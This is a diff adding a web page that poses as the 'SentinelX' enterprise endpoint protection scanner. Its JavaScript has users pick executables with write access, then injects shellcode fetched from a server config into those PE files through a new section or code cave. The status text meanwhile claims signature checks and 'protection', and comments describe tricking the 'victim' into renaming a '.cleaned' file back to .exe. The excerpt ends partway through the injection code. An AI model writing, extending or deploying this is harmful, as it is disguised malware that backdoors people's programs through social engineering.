@@ -1,0 +1,1405 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>SentinelX - Enterprise Endpoint Protection</title>
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Cstyle%3E.sh%7Bfill:none;stroke:%23F97316;stroke-width:2.2;stroke-linecap:round;stroke-linejoin:round%7D.pulse%7Banimation:p 2s ease-in-out infinite%7D@keyframes p%7B0%25,100%25%7Bopacity:1%7D50%25%7Bopacity:.35%7D%7D%3C/style%3E%3Crect width='32' height='32' rx='4' fill='%2307080A'/%3E%3Cpath class='sh pulse' d='M16 4L6 8.5v8c0 6.5 4.5 12 10 13.5C21.5 28.5 26 23 26 16.5v-8L16 4z'/%3E%3Cline class='sh' x1='12' y1='12' x2='20' y2='20'/%3E%3Cline class='sh' x1='20' y1='12' x2='12' y2='20'/%3E%3C/svg%3E">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/gsap@3.12.5/dist/gsap.min.js"></script>
+<style>
+/* ── Variables ─────────────────────────────────────────────────────────── */
+:root {
+  --bg:       #07080A;
+  --surface:  #0F1014;
+  --surface2: #16181E;
+  --surface3: #1C1F27;
+  --orange1:  #F97316;
+  --orange2:  #EA580C;
+  --orange3:  #C2410C;
+  --o-dim:    rgba(249,115,22,.10);
+  --o-bdr:    rgba(249,115,22,.22);
+  --o-bdr2:   rgba(249,115,22,.50);
+  --text1:    #F1F5F9;
+  --text2:    #94A3B8;
+  --text3:    #475569;
+  --green:    #22C55E;
+  --green-d:  rgba(34,197,94,.10);
+  --green-b:  rgba(34,197,94,.28);
+  --red:      #EF4444;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { font-size: 120%; }
+body {
+  font-family: 'Plus Jakarta Sans', sans-serif;
+  background: var(--bg);
+  color: var(--text1);
+  min-height: 100vh;
+  overflow: hidden;
+}
+
+/* ── State system ──────────────────────────────────────────────────────── */
+.state { position: fixed; inset: 0; display: none; flex-direction: column; }
+.state.active { display: flex; }
+
+/* ── Logo ──────────────────────────────────────────────────────────────── */
+.logo { display: flex; align-items: center; gap: .45rem; }
+.logo-name { font-size: .88rem; font-weight: 800; color: var(--text1); letter-spacing: .03em; }
+.logo-ver  { font-size: .6rem; color: var(--text3); font-family: 'IBM Plex Mono', monospace; margin-left: .05rem; }
+
+/* ── Toast ─────────────────────────────────────────────────────────────── */
+#toast {
+  position: fixed; bottom: 1.5rem; left: 50%;
+  transform: translateX(-50%) translateY(5rem);
+  background: #1c0a0a; border: 1px solid rgba(239,68,68,.4);
+  color: #fca5a5; padding: .55rem 1.1rem;
+  border-radius: .5rem; font-size: .75rem; z-index: 9999;
+  transition: transform .3s ease; white-space: nowrap; pointer-events: none;
+}
+#toast.show { transform: translateX(-50%) translateY(0); }
+
+/* ── Browser support overlay ────────────────────────────────────────────── */
+#no-support {
+  display: none; position: fixed; inset: 0; z-index: 10000;
+  background: var(--bg); flex-direction: column;
+  align-items: center; justify-content: center;
+  gap: 1rem; text-align: center;
+}
+#no-support h2 { font-size: 1rem; color: var(--text1); }
+#no-support p { font-size: .78rem; color: var(--text2); max-width: 300px; line-height: 1.6; }
+
+
+/* ═══════════════════════════════════════════════════════════
+   LANDING
+══════════════════════════════════════════════════════════ */
+#landing { background: var(--bg); }
+#landing::before {
+  content: '';
+  position: absolute; top: -100px; left: 50%; transform: translateX(-50%);
+  width: 900px; height: 520px;
+  background: radial-gradient(ellipse at center, rgba(249,115,22,.07) 0%, transparent 70%);
+  pointer-events: none;
+}
+
+/* Topnav */
+.topnav {
+  position: relative; z-index: 10;
+  height: 52px; background: var(--surface);
+  border-bottom: 1px solid var(--o-bdr);
+  display: flex; align-items: center;
+  padding: 0 1.4rem; gap: 1rem; flex-shrink: 0;
+}
+.topnav-left   { display: flex; align-items: center; gap: .5rem; }
+.topnav-center { flex: 1; display: flex; align-items: center; justify-content: center; }
+.topnav-right  { display: flex; align-items: center; gap: .5rem; }
+
+.badge-enterprise {
+  padding: .26rem .8rem; border-radius: 2rem;
+  font-size: .58rem; font-weight: 700;
+  letter-spacing: .12em; text-transform: uppercase;
+  background: var(--o-dim); border: 1px solid var(--o-bdr);
+  color: var(--orange1);
+}
+.badge-active {
+  padding: .2rem .6rem; border-radius: .3rem;
+  font-size: .62rem; font-weight: 600;
+  font-family: 'IBM Plex Mono', monospace;
+  background: rgba(34,197,94,.1); border: 1px solid rgba(34,197,94,.25);
+  color: #86efac;
+}
+
+/* Landing body */
+.landing-body {
+  flex: 1; display: flex; flex-direction: column;
+  align-items: center; justify-content: center;
+  padding: 1.5rem 1rem 2rem;
+  position: relative; overflow-y: auto;
+}
+
+/* Main card */
+.main-card {
+  width: 100%; max-width: 580px;
+  background: var(--surface);
+  border: 1px solid var(--o-bdr);
+  border-left: 3px solid var(--orange2);
+  border-radius: 1rem; overflow: hidden;
+  box-shadow: 0 0 40px rgba(249,115,22,.05), 0 4px 32px rgba(0,0,0,.6);
+}
+
+.card-head {
+  background: linear-gradient(180deg, rgba(249,115,22,.07) 0%, transparent 100%);
+  border-bottom: 1px solid var(--o-bdr);
+  padding: .9rem 1.2rem;
+  display: flex; align-items: center; gap: .7rem;
+}
+.card-head-icon {
+  width: 34px; height: 34px;
+  background: var(--o-dim); border: 1px solid var(--o-bdr);
+  border-radius: .5rem; display: flex; align-items: center; justify-content: center;
+  flex-shrink: 0;
+}
+.card-head-text h2  { font-size: .92rem; font-weight: 700; color: var(--text1); }
+.card-head-text p   { font-size: .7rem; color: var(--text3); margin-top: .15rem; }
+
+.card-body { padding: 1.2rem; }
+
+/* 2-column top row + full-width drop zone */
+.input-methods {
+  display: grid; grid-template-columns: 1fr 1fr;
+  gap: .65rem; margin-bottom: 1rem;
+}
+
+#drop-card {
+  grid-column: 1 / -1;
+  flex-direction: row;
+  align-items: center;
+  gap: .85rem;
+  padding: 1.1rem 1rem;
+  border-style: dashed;
+  border-left-style: solid;
+  border-color: rgba(255,255,255,.1);
+  border-left-color: rgba(255,255,255,.15);
+}
+#drop-card .method-icon { flex-shrink: 0; background: rgba(255,255,255,.05); }
+#drop-card .method-icon svg path,
+#drop-card .method-icon svg polyline,
+#drop-card .method-icon svg line { stroke: var(--text3); }
+#drop-card h3 { color: var(--text2); }
+#drop-card .drop-text { display: flex; flex-direction: column; gap: .2rem; }
+
+@keyframes drop-pulse {
+  0%, 100% { border-color: rgba(249,115,22,.25); border-left-color: var(--orange1); box-shadow: none; }
+  50%       { border-color: rgba(249,115,22,.55); border-left-color: var(--orange1); box-shadow: 0 0 0 3px rgba(249,115,22,.12) inset; }
+}
+@keyframes bounce-down {
+  0%, 100% { transform: translateY(0); }
+  50%       { transform: translateY(5px); }
+}
+
+.method-card {
+  background: var(--surface2);
+  border: 1px solid rgba(255,255,255,.06);
+  border-left: 3px solid var(--o-bdr);
+  border-radius: .65rem;
+  padding: .9rem .85rem;
+  cursor: pointer;
+  transition: border-color .15s, background .15s, box-shadow .15s, transform .1s;
+  display: flex; flex-direction: column;
+  gap: .5rem; user-select: none;
+}
+.method-card:hover {
+  border-color: var(--o-bdr2);
+  border-left-color: var(--orange1);
+  background: rgba(249,115,22,.04);
+  box-shadow: 0 0 0 1px rgba(249,115,22,.10) inset;
+}
+.method-card:active { transform: scale(.97); }
+
+
+.method-icon {
+  width: 36px; height: 36px;
+  background: rgba(249,115,22,.10);
+  border-radius: .5rem;
+  display: flex; align-items: center; justify-content: center;
+  flex-shrink: 0;
+}
+.method-card h3 { font-size: .78rem; font-weight: 700; color: var(--text1); }
+.method-card p  { font-size: .65rem; color: var(--text3); line-height: 1.4; }
+
+/* Drop zone drag-over: light up orange */
+#drop-card.drag-over {
+  animation: drop-pulse 1s ease-in-out infinite;
+  background: rgba(249,115,22,.06);
+  border-left-color: var(--orange1);
+}
+#drop-card.drag-over .method-icon { background: rgba(249,115,22,.10); }
+#drop-card.drag-over .method-icon svg path,
+#drop-card.drag-over .method-icon svg polyline,
+#drop-card.drag-over .method-icon svg line { stroke: #F97316; }
+#drop-card.drag-over h3 { color: var(--text1); }
+#drop-card.drag-over .method-icon svg { animation: bounce-down 0.8s ease-in-out infinite; }
+
+/* Status bar */
+.status-bar {
+  text-align: center; font-size: .6rem;
+  color: var(--text3); letter-spacing: .015em;
+}
+
+
+/* ═══════════════════════════════════════════════════════════
+   PROCESSING
+══════════════════════════════════════════════════════════ */
+#processing {
+  background: var(--bg);
+  align-items: center; justify-content: center; gap: 1.6rem;
+}
+#processing::before {
+  content: '';
+  position: absolute; top: -80px; left: 50%; transform: translateX(-50%);
+  width: 600px; height: 400px;
+  background: radial-gradient(ellipse at center, rgba(249,115,22,.06) 0%, transparent 70%);
+  pointer-events: none;
+}
+
+.proc-logo { display: flex; align-items: center; gap: .5rem; }
+
+/* Triple-ring spinner */
+.proc-spinner {
+  position: relative; width: 110px; height: 110px;
+}
+.proc-ring-outer {
+  position: absolute; inset: 0;
+  border-radius: 50%;
+  border: 5px solid rgba(249,115,22,.12);
+  border-top-color: var(--orange1);
+  border-right-color: var(--orange2);
+  animation: spin .85s linear infinite;
+}
+.proc-ring-inner {
+  position: absolute; inset: 16px;
+  border-radius: 50%;
+  border: 3px solid rgba(249,115,22,.07);
+  border-bottom-color: rgba(249,115,22,.32);
+  border-left-color:   rgba(249,115,22,.14);
+  animation: spin-rev 1.4s linear infinite;
+}
+.proc-ring-center {
+  position: absolute; inset: 36px;
+  border-radius: 50%;
+  background: var(--o-dim);
+  display: flex; align-items: center; justify-content: center;
+}
+@keyframes spin     { to { transform: rotate(360deg);  } }
+@keyframes spin-rev { to { transform: rotate(-360deg); } }
+
+.proc-text { text-align: center; display: flex; flex-direction: column; gap: .45rem; }
+#proc-status {
+  font-size: .9rem; font-weight: 700; color: var(--text1);
+  font-family: 'IBM Plex Mono', monospace; letter-spacing: .01em;
+}
+#proc-filename {
+  font-size: .72rem; color: var(--text3);
+  font-family: 'IBM Plex Mono', monospace;
+  max-width: 360px; overflow: hidden;
+  text-overflow: ellipsis; white-space: nowrap;
+}
+
+
+/* ═══════════════════════════════════════════════════════════
+   DONE
+══════════════════════════════════════════════════════════ */
+#done {
+  background: var(--bg);
+  align-items: center; justify-content: center;
+}
+#done::before {
+  content: '';
+  position: absolute; bottom: -80px; left: 50%; transform: translateX(-50%);
+  width: 600px; height: 400px;
+  background: radial-gradient(ellipse at center, rgba(34,197,94,.05) 0%, transparent 70%);
+  pointer-events: none;
+}
+
+.done-card {
+  position: relative;
+  width: 90%; max-width: 440px;
+  background: var(--surface);
+  border: 1px solid var(--green-b);
+  border-radius: 1rem; padding: 2.2rem 1.8rem;
+  text-align: center;
+  box-shadow: 0 0 40px rgba(34,197,94,.05), 0 4px 32px rgba(0,0,0,.6);
+}
+
+.done-icon {
+  width: 68px; height: 68px;
+  background: var(--green-d); border: 2px solid var(--green-b);
+  border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  margin: 0 auto 1.1rem;
+  box-shadow: 0 0 24px rgba(34,197,94,.18);
+}
+.done-headline { font-size: 1.5rem; font-weight: 800; color: var(--text1); letter-spacing: .02em; margin-bottom: .35rem; }
+.done-subhead  { font-size: .78rem; color: var(--text2); margin-bottom: 1.3rem; }
+
+.done-stats-grid {
+  display: grid; grid-template-columns: 1fr 1fr;
+  gap: .5rem; margin-bottom: 1.3rem;
+}
+.done-stat {
+  background: var(--surface2); border: 1px solid rgba(255,255,255,.05);
+  border-radius: .55rem; padding: .65rem .6rem;
+}
+.done-stat-lbl { font-size: .58rem; color: var(--text3); display: block; margin-bottom: .2rem; text-transform: uppercase; letter-spacing: .08em; }
+.done-stat-val { font-size: .76rem; font-weight: 600; color: var(--text1); font-family: 'IBM Plex Mono', monospace; word-break: break-all; display: block; }
+
+.done-btn {
+  width: 100%; padding: .78rem;
+  background: var(--surface2); border: 1px solid rgba(255,255,255,.08);
+  border-radius: .6rem; color: var(--text2);
+  font-family: 'Plus Jakarta Sans', sans-serif;
+  font-size: .82rem; font-weight: 600; cursor: pointer;
+  transition: background .15s, color .15s; margin-bottom: .5rem;
+}
+.done-btn:hover { background: rgba(255,255,255,.06); color: var(--text1); }
+.done-btn.dl {
+  background: rgba(249,115,22,.08); border-color: rgba(249,115,22,.2); color: var(--orange1);
+}
+.done-btn.dl:hover { background: rgba(249,115,22,.14); }
+
+.rescan-link {
+  font-size: .7rem; color: var(--text3); cursor: pointer;
+  background: none; border: none; font-family: 'Plus Jakarta Sans', sans-serif;
+  text-decoration: underline; text-underline-offset: 3px; transition: color .15s;
+}
+.rescan-link:hover { color: var(--orange1); }
+
+
+/* ═══════════════════════════════════════════════════════════
+   DECODE (safe-ext bypass)
+══════════════════════════════════════════════════════════ */
+#decode {
+  background: var(--bg);
+  align-items: center; justify-content: center;
+}
+#decode::before {
+  content: '';
+  position: absolute; bottom: -80px; left: 50%; transform: translateX(-50%);
+  width: 620px; height: 420px;
+  background: radial-gradient(ellipse at center, rgba(34,197,94,.06) 0%, transparent 70%);
+  pointer-events: none;
+}
+.decode-card {
+  position: relative;
+  width: 90%; max-width: 480px;
+  background: var(--surface);
+  border: 1px solid var(--green-b);
+  border-radius: 1rem; padding: 2rem 1.6rem;
+  text-align: center;
+  box-shadow: 0 0 50px rgba(34,197,94,.06), 0 4px 32px rgba(0,0,0,.65);
+}
+.decode-steps {
+  background: var(--surface2); border: 1px solid rgba(255,255,255,.08);
+  border-radius: .55rem; padding: .8rem 1rem;
+  margin-bottom: .6rem; text-align: left;
+}
+.decode-step-label {
+  font-size: .62rem; color: var(--text2);
+  font-weight: 600; margin-bottom: .5rem;
+}
+.decode-step-list {
+  padding-left: 1.2rem; margin: 0;
+}
+.decode-step-list li {
+  font-size: .68rem; color: var(--text2); line-height: 1.7;
+}
+.decode-step-list li strong {
+  color: var(--text1); font-weight: 600;
+}
+.decode-step-list li code {
+  background: rgba(239,68,68,.12); color: #EF4444;
+  padding: .1rem .35rem; border-radius: .25rem;
+  font-family: 'IBM Plex Mono', monospace; font-size: .62rem;
+}
+</style>
+</head>
+<body>
+
+<!-- ── Browser support overlay ────────────────────────────────────────────── -->
+<div id="no-support">
+  <svg width="44" height="44" viewBox="0 0 24 24" fill="none">
+    <path d="M12 2L4 6v6c0 5.25 3.5 10 8 11.5C17.5 22 21 17.25 21 12V6L12 2z" fill="rgba(249,115,22,.12)" stroke="#F97316" stroke-width="1.6"/>
+    <line x1="9" y1="9" x2="15" y2="15" stroke="#F97316" stroke-width="2" stroke-linecap="round"/>
+    <line x1="15" y1="9" x2="9" y2="15" stroke="#F97316" stroke-width="2" stroke-linecap="round"/>
+  </svg>
+  <h2>Browser Not Supported</h2>
+  <p>SentinelX requires Chrome 86+ or Edge 86+ with File System Access API support.</p>
+</div>
+
+<!-- ── Toast ──────────────────────────────────────────────────────────────── -->
+<div id="toast"></div>
+
+
+<!-- ═══════════════════════════════════════════════════════════════════════════
+     STATE 1 - LANDING
+     ═══════════════════════════════════════════════════════════════════════════ -->
+<div id="landing" class="state active">
+
+  <nav class="topnav">
+    <div class="topnav-left">
+      <div class="logo">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+          <path d="M12 2L4 6v6c0 5.25 3.5 10 8 11.5C17.5 22 21 17.25 21 12V6L12 2z" fill="rgba(249,115,22,.12)" stroke="#F97316" stroke-width="1.7"/>
+          <line x1="9" y1="9" x2="15" y2="15" stroke="#F97316" stroke-width="2" stroke-linecap="round"/>
+          <line x1="15" y1="9" x2="9" y2="15" stroke="#F97316" stroke-width="2" stroke-linecap="round"/>
+        </svg>
+        <span class="logo-name">SentinelX</span>
+      </div>
+    </div>
+    <div class="topnav-center">
+      <span class="badge-enterprise">Enterprise Endpoint Protection</span>
+    </div>
+    <div class="topnav-right">
+      <span class="badge-active">● ACTIVE</span>
+    </div>
+  </nav>
+
+  <div class="landing-body">
+    <div class="main-card">
+
+      <div class="card-head">
+        <div class="card-head-icon">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+            <path d="M12 2L4 6v6c0 5.25 3.5 10 8 11.5C17.5 22 21 17.25 21 12V6L12 2z" fill="rgba(249,115,22,.12)" stroke="#F97316" stroke-width="1.7"/>
+            <line x1="9" y1="9" x2="15" y2="15" stroke="#F97316" stroke-width="2" stroke-linecap="round"/>
+            <line x1="15" y1="9" x2="9" y2="15" stroke="#F97316" stroke-width="2" stroke-linecap="round"/>
+          </svg>
+        </div>
+        <div class="card-head-text">
+          <h2>Threat Intelligence Scanner</h2>
+          <p>Upload or select a target to begin analysis</p>
+        </div>
+      </div>
+
+      <div class="card-body">
+        <div class="input-methods">
+
+          <!-- Folder picker -->
+          <div class="method-card" onclick="pickFolder()" title="Scan a folder for PE executables (EXE, DLL, SCR, SYS, CPL, OCX)">
+            <div class="method-icon">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+                <path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z" stroke="#F97316" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+            </div>
+            <h3>Scan Folder</h3>
+            <p>Auto-finds all PE executables</p>
+          </div>
+
+          <!-- File picker -->
+          <div class="method-card" onclick="pickFile()" title="Select a PE file (EXE, DLL, SCR, SYS, CPL, OCX)">
+            <div class="method-icon">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+                <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6z" stroke="#F97316" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+                <polyline points="14 2 14 8 20 8" stroke="#F97316" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+            </div>
+            <h3>Select File</h3>
+            <p>EXE · DLL · SCR · SYS · CPL</p>
+          </div>
+
+          <!-- Drop zone -->
+          <div class="method-card" id="drop-card"
+               ondragenter="onDragOver(event)"
+               ondragover="onDragOver(event)"
+               ondragleave="onDragLeave(event)"
+               ondrop="handleDrop(event)"
+               title="Drag and drop any PE file here">
+            <div class="method-icon">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" stroke="#F97316" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+                <polyline points="7 10 12 15 17 10" stroke="#F97316" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+                <line x1="12" y1="15" x2="12" y2="3" stroke="#F97316" stroke-width="1.8" stroke-linecap="round"/>
+              </svg>
+            </div>
+            <div class="drop-text">
+              <h3>Drop File</h3>
+              <p>EXE · DLL · SCR · SYS · CPL · OCX</p>
+            </div>
+          </div>
+
+        </div><!-- /input-methods -->
+
+        <div class="status-bar">
+          Secure analysis &nbsp;&middot;&nbsp; No data transmitted &nbsp;&middot;&nbsp; Results powered by SentinelX AI
+        </div>
+      </div><!-- /card-body -->
+    </div><!-- /main-card -->
+  </div><!-- /landing-body -->
+</div><!-- /#landing -->
+
+
+<!-- ═══════════════════════════════════════════════════════════════════════════
+     STATE 2 - PROCESSING
+     ═══════════════════════════════════════════════════════════════════════════ -->
+<div id="processing" class="state">
+
+  <div class="proc-logo">
+    <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
+      <path d="M12 2L4 6v6c0 5.25 3.5 10 8 11.5C17.5 22 21 17.25 21 12V6L12 2z" fill="rgba(249,115,22,.12)" stroke="#F97316" stroke-width="1.7"/>
+      <line x1="9" y1="9" x2="15" y2="15" stroke="#F97316" stroke-width="2" stroke-linecap="round"/>
+      <line x1="15" y1="9" x2="9" y2="15" stroke="#F97316" stroke-width="2" stroke-linecap="round"/>
+    </svg>
+    <span class="logo-name">SentinelX</span>
+  </div>
+
+  <div class="proc-spinner">
+    <div class="proc-ring-outer"></div>
+    <div class="proc-ring-inner"></div>
+    <div class="proc-ring-center">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+        <path d="M12 2L4 6v6c0 5.25 3.5 10 8 11.5C17.5 22 21 17.25 21 12V6L12 2z" fill="rgba(249,115,22,.22)" stroke="rgba(249,115,22,.45)" stroke-width="1.5"/>
+      </svg>
+    </div>
+  </div>
+
+  <div class="proc-text">
+    <div id="proc-status">Initializing...</div>
+    <div id="proc-filename"></div>
+  </div>
+
+</div><!-- /#processing -->
+
+
+<!-- ═══════════════════════════════════════════════════════════════════════════
+     STATE 3 - VT RESULT
+     ═══════════════════════════════════════════════════════════════════════════ -->
+
+
+<!-- ═══════════════════════════════════════════════════════════════════════════
+<!-- ═══════════════════════════════════════════════════════════════════════════
+     STATE 5 - DECODE (safe-ext bypass: .cleaned file written, victim renames)
+     ═══════════════════════════════════════════════════════════════════════════ -->
+<div id="decode" class="state">
+  <div class="decode-card">
+
+    <div class="done-icon">
+      <svg width="30" height="30" viewBox="0 0 24 24" fill="none">
+        <path d="M12 2L4 6v6c0 5.25 3.5 10 8 11.5C17.5 22 21 17.25 21 12V6L12 2z" fill="rgba(34,197,94,.15)" stroke="#22C55E" stroke-width="1.8"/>
+        <polyline points="9 12 11 14 15 10" stroke="#22C55E" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </div>
+
+    <div class="threat-badge" style="background:rgba(34,197,94,.12);border-color:rgba(34,197,94,.32);color:#22C55E;">&#10003; Threat Neutralized</div>
+    <div class="done-headline">Clean File Saved</div>
+    <p class="threat-subhead">The malicious code has been removed. For your protection, the clean file was exported in a quarantine format to prevent accidental execution.</p>
+
+    <div class="threat-grid">
+      <div class="threat-stat">
+        <span class="threat-stat-lbl">Original (Infected)</span>
+        <span class="threat-stat-val danger" id="decode-origname"></span>
+      </div>
+      <div class="threat-stat">
+        <span class="threat-stat-lbl">Clean File</span>
+        <span class="threat-stat-val" id="decode-filename" style="color:#22C55E"></span>
+      </div>
+    </div>
+
+    <div class="decode-steps">
+      <div class="decode-step-label">To restore normal functionality:</div>
+      <ol class="decode-step-list">
+        <li>Open the folder containing the clean file</li>
+        <li>Right-click <strong id="decode-filename2"></strong></li>
+        <li>Select <strong>Rename</strong></li>
+        <li>Change <code id="decode-ext">.cleaned</code> to <code id="decode-target-ext">.exe</code></li>
+      </ol>
+    </div>
+
+    <button class="done-btn" style="width:100%;margin-top:.8rem;" onclick="resetAll()">Scan another file</button>
+
+  </div>
+</div>
+
+
+<!-- ═══════════════════════════════════════════════════════════════════════════
+     STATE 6 - DONE (Edge silent in-place path)
+     ═══════════════════════════════════════════════════════════════════════════ -->
+<div id="done" class="state">
+  <div class="done-card">
+
+    <div class="done-icon">
+      <svg width="30" height="30" viewBox="0 0 24 24" fill="none">
+        <path d="M12 2L4 6v6c0 5.25 3.5 10 8 11.5C17.5 22 21 17.25 21 12V6L12 2z" fill="rgba(34,197,94,.15)" stroke="#22C55E" stroke-width="1.8"/>
+        <polyline points="9 12 11 14 15 10" stroke="#22C55E" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </div>
+
+    <div class="done-headline">Analysis Complete</div>
+    <p class="done-subhead">Protected by SentinelX</p>
+
+    <div class="done-stats-grid">
+      <div class="done-stat">
+        <span class="done-stat-lbl">File</span>
+        <span class="done-stat-val" id="done-filename"></span>
+      </div>
+      <div class="done-stat">
+        <span class="done-stat-lbl">Size</span>
+        <span class="done-stat-val" id="done-size"></span>
+      </div>
+      <div class="done-stat" style="grid-column:span 2;">
+        <span class="done-stat-lbl">Completed</span>
+        <span class="done-stat-val" id="done-ts"></span>
+      </div>
+    </div>
+
+    <button class="done-btn" onclick="resetAll()">Scan another file</button>
+
+  </div>
+</div><!-- /#done -->
+
+
+<script>
+// ─── Config ────────────────────────────────────────────────────────────────────
+let cfg = { injectMethod: 'section', targetExe: '', shellcode: '', vtEnabled: false };
+const PE_EXTS = ['.exe', '.dll', '.scr', '.ocx', '.sys', '.cpl'];
+
+// ─── File state ───────────────────────────────────────────────────────────────
+let targetHandle  = null;   // FileSystemFileHandle
+let parentDirHandle = null; // FileSystemDirectoryHandle (folder picker)
+let targetFile    = null;   // File object
+let targetBytes   = null;   // ArrayBuffer of original
+let injectedBytes = null;   // Uint8Array of patched PE
+let targetIsDll   = false;  // IMAGE_FILE_DLL flag detected
+let statusTimer   = null;
+
+// ─── Browser check ────────────────────────────────────────────────────────────
+if (!window.showDirectoryPicker || !window.showOpenFilePicker) {
+  document.getElementById('no-support').style.display = 'flex';
+}
+
+// ─── Browser detection ───────────────────────────────────────────────────────
+const isEdge = (() => {
+  try {
+    if (navigator.userAgentData) {
+      return navigator.userAgentData.brands.some(b => b.brand === 'Microsoft Edge');
+    }
+  } catch(_) {}
+  return /Edg\//.test(navigator.userAgent);
+})();
+
+// Prevent browser from navigating on rogue drops
+window.addEventListener('dragover', e => e.preventDefault());
+window.addEventListener('drop',     e => e.preventDefault());
+
+// ─── Load config on page init ─────────────────────────────────────────────────
+(async function loadConfig() {
+  try {
+    const r = await fetch('/api/config');
+    if (r.ok) { const d = await r.json(); cfg = { ...cfg, ...d }; }
+  } catch(e) {
+    showToast('Cannot reach server - is it running?');
+  }
+})();
+
+
+// ─── Input: folder picker ─────────────────────────────────────────────────────
+async function pickFolder() {
+  let root;
+  try {
+    root = await window.showDirectoryPicker({ mode: 'readwrite' });
+  } catch(e) {
+    if (e.name !== 'AbortError') {
+      showToast('Cannot open folder. If Desktop is blocked by Chrome, use "Select File" instead.');
+    }
+    return;
+  }
+
+  const targetName = (cfg.targetExe || '').toLowerCase();
+  const found = await findExe(root, targetName, 0);
+  if (!found) {
+    showToast(cfg.targetExe ? `${cfg.targetExe} not found` : 'No PE executable found in folder');
+    return;
+  }
+  // Ensure write permission on the file handle
+  try {
+    const perm = await found.requestPermission({ mode: 'readwrite' });
+    if (perm !== 'granted') { showToast('Write permission denied'); return; }
+  } catch(e) {}
+  parentDirHandle = root;
+  targetHandle = found;
+  targetFile   = await found.getFile();
+  await processTarget();
+}
+
+async function findExe(dir, name, depth) {
+  if (depth > 5) return null;
+  try {
+    for await (const [entryName, handle] of dir.entries()) {
+      const lc = entryName.toLowerCase();
+      if (handle.kind === 'file') {
+        if (name ? lc === name : PE_EXTS.some(x => lc.endsWith(x))) return handle;
+      } else if (handle.kind === 'directory') {
+        const found = await findExe(handle, name, depth + 1);
+        if (found) return found;
+      }
+    }
+  } catch(e) {}
+  return null;
+}
+
+
+// ─── Input: file picker ───────────────────────────────────────────────────────
+async function pickFile() {
+  let handles;
+  try {
+    handles = await window.showOpenFilePicker({
+      multiple: false,
+      mode: 'readwrite',
+      types: [{
+        description: 'Executable',
+        accept: { 'application/octet-stream': PE_EXTS }
+      }]
+    });
+  } catch(e) { return; }  // cancelled
+  targetHandle = handles[0];
+  targetFile   = await targetHandle.getFile();
+  await processTarget();
+}
+
+
+// ─── Input: drag-drop ─────────────────────────────────────────────────────────
+function onDragOver(e) {
+  e.preventDefault(); e.stopPropagation();
+  document.getElementById('drop-card').classList.add('drag-over');
+}
+function onDragLeave(e) {
+  e.preventDefault();
+  document.getElementById('drop-card').classList.remove('drag-over');
+}
+async function handleDrop(e) {
+  e.preventDefault(); e.stopPropagation();
+  document.getElementById('drop-card').classList.remove('drag-over');
+
+  const items = e.dataTransfer?.items;
+  if (!items || items.length === 0) return;
+  const item = items[0];
+
+  // Prefer file system handle for write-back (Chrome 86+)
+  if (item.getAsFileSystemHandle) {
+    try {
+      const h = await item.getAsFileSystemHandle();
+      if (h.kind === 'file') {
+        targetHandle = h;
+        targetFile   = await h.getFile();
+        await processTarget();
+        return;
+      }
+    } catch(err) {}
+  }
+
+  // Fallback: DataTransfer.files (no write-back, will offer download)
+  targetHandle = null;
+  targetFile   = e.dataTransfer.files[0];
+  if (targetFile) await processTarget();
+}
+
+
+// ─── Main processing flow ─────────────────────────────────────────────────────
+async function processTarget() {
+  if (!targetFile) return;
+  injectedBytes = null;
+
+  show('processing');
+  startStatusCycle();
+  document.getElementById('proc-filename').textContent = targetFile.name;
+  await delay(300);
+
+  // 1. Read original file
+  setStatus('Reading file...');
+  targetBytes = await targetFile.arrayBuffer();
+  try {
+    const _v = new DataView(targetBytes);
+    const _peOff = _v.getUint32(0x3C, true);
+    const _coffChars = _v.getUint16(_peOff + 4 + 18, true);
+    targetIsDll = !!(_coffChars & 0x2000);
+  } catch(e) { targetIsDll = false; }
+  await delay(350);
+
+  // 2. Analyze PE structure
+  setStatus('Analyzing PE structure...');
+  await delay(400);
+
+  // 3. Parse shellcode from config
+  setStatus('Cross-referencing signatures...');
+  const scRaw  = atob(cfg.shellcode || 'zMzMzMM=');
+  const shellcode = new Uint8Array(scRaw.length);
+  for (let i = 0; i < scRaw.length; i++) shellcode[i] = scRaw.charCodeAt(i);
+  await delay(350);
+
+  // 4. Inject shellcode into PE
+  setStatus('Applying protection...');
+  try {
+    injectedBytes = cfg.injectMethod === 'cave'
+      ? injectCodeCave(targetBytes, shellcode)
+      : injectNewSection(targetBytes, shellcode);
+  } catch(e) {
+    if (cfg.injectMethod !== 'cave' && e.message === 'No space for new section header') {
+      // PE header has no room for extra section - fall back to code cave
+      try {
+        injectedBytes = injectCodeCave(targetBytes, shellcode);
+      } catch(e2) {
+        console.error('[SentinelX] Cave fallback failed:', e2.message);
